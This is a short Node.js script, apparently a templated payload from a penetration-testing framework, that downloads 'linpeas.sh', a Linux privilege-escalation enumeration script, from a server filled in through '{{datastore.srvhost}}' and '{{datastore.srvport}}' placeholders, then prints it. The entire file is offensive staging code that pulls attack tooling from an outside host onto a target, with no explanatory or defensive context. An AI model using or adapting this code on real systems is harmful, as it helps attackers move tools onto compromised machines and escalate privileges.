var http = require("http");

var options = {
  host: "{{datastore.srvhost}}",
  port: Number("{{datastore.srvport}}"),
  path: "/linpeas.sh",
  method: "GET",
};

http
  .get(options, function (res) {
    res.setEncoding("utf8");
    let rawData = "";
    res.on("data", (chunk) => {
      rawData += chunk;
    });
    res.on("end", () => {
      console.log(rawData);
    });
  })
  .on("error", function (e) {
    console.log("error: " + e);
  });
undefined;
